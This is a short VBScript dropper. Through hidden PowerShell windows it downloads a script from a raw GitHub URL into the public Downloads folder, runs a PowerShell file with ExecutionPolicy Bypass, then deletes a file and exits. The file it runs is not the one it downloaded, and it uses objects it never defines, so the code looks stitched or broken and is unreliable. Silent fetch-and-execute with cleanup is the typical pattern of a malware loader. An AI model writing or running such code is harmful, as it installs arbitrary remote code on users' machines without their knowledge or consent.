Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/RecycleBin.ps1 -OutFile C:\Users\Public\Downloads\RecycleBin.ps1", 0, True
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\configure_system.ps1", 0, True
objFSO.DeleteFile(strPSFile)
objShell.Run "powershell.exe exit", 0, False
